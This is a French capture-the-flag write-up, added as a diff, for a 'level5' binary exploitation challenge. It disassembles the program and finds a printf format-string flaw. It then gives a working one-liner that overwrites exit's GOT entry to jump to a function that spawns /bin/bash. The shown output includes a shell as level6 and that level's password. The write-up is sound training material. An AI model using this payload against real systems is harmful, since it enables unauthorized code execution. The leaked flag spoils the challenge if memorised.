@@ -1,0 +1,80 @@
+#	Toujours un programme similaire, la difference se fera au niveau du code:
+
+$> objdump -d level5
+[...]
+080484a4 <o>:
+ 80484a4:	55                   	push   %ebp
+ 80484a5:	89 e5                	mov    %esp,%ebp
+ 80484a7:	83 ec 18             	sub    $0x18,%esp
+ 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
+ 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>	<--	system("/bin/bash"
+ 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+ 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>	<--	exit(1)
+
+080484c2 <n>:
+ 80484c2:	55                   	push   %ebp
+ 80484c3:	89 e5                	mov    %esp,%ebp
+ 80484c5:	81 ec 18 02 00 00    	sub    $0x218,%esp
+ 80484cb:	a1 48 98 04 08       	mov    0x8049848,%eax
+ 80484d0:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 80484d4:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
+ 80484db:	00
+ 80484dc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax	<--	buff[520]
+ 80484e2:	89 04 24             	mov    %eax,(%esp)
+ 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>	<--	fgets(buff, 512, stdin)
+ 80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 80484f0:	89 04 24             	mov    %eax,(%esp)
+ 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>	<--	printf(buff)
+ 80484f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+ 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>	<--	exit(1)
+
+08048504 <main>:
+ 8048504:	55                   	push   %ebp
+ 8048505:	89 e5                	mov    %esp,%ebp
+ 8048507:	83 e4 f0             	and    $0xfffffff0,%esp
+ 804850a:	e8 b3 ff ff ff       	call   80484c2 <n>			<--	n()
+ 804850f:	c9                   	leave
+ 8048510:	c3                   	ret
+ 8048511:	90                   	nop
+ 8048512:	90                   	nop
+ 8048513:	90                   	nop
+ 8048514:	90                   	nop
+ 8048515:	90                   	nop
+ 8048516:	90                   	nop
+ 8048517:	90                   	nop
+ 8048518:	90                   	nop
+ 8048519:	90                   	nop
+ 804851a:	90                   	nop
+ 804851b:	90                   	nop
+ 804851c:	90                   	nop
+ 804851d:	90                   	nop
+ 804851e:	90                   	nop
+ 804851f:	90                   	nop
+[...]
+
+#	Dans ce programme la fonction dans laquelle on souhaite entrer o() n'est pas appelee. La faille est la meme: printf.
+#	Cependant ici le programme va directement exit apres l'appel de printf, donc impossible de modifier l'adresse de retour. Par contre, exit est une fonction faisant partie de la GOT, si l'on regarde avec objdump on voit ca:
+
+$> objdump -d level5
+[...]
+080483d0 <exit@plt>:
+ 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
+ 80483d6:	68 28 00 00 00       	push   $0x28
+ 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>
+[...]
+
+#	L'appel a exit va directement jump sur une fonction sur la GOT. Il va donc falloir modifier la valeur a cette adresse par l'adresse de la fonction o(): 080484a4 soit 134513826 en decimal:
+
+#	Deja trouver la position du buffer sur la stack:
+
+$> python -c 'print "AAAA" + 6*"%08x."' | ./level5
+AAAA00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e.
+
+#	On voit que le buffer est a la 4eme position, maintenant petite ligne reprenant la meme logique que l'exercice precedent:
+
+$> (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; cat - ) | ./level
+[...]
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
